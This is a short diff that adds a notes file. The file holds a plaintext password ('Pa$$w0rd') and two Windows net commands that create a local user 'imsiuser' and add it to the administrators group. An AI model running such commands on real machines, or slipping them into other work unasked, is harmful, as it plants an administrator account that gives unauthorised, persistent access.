@@ -1,0 +1,7 @@
+#
+
+password : Pa$$w0rd
+
+command
+net users imsiuser * /add
+net localgroup administrators imsiuser /add
